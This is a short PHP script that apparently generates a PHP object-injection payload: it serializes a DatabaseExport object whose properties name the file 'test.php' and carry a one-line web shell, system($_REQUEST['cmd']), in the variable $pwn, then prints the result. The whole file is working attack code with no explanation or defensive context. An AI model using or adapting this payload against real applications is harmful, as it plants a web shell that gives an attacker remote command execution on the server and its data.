<?php

class DatabaseExport
{
	public $user_file = 'test.php';
    public $data = '<?php system($_REQUEST["cmd"]); ?> ';

}

$pwn = new DatabaseExport;
echo (serialize($pwn));
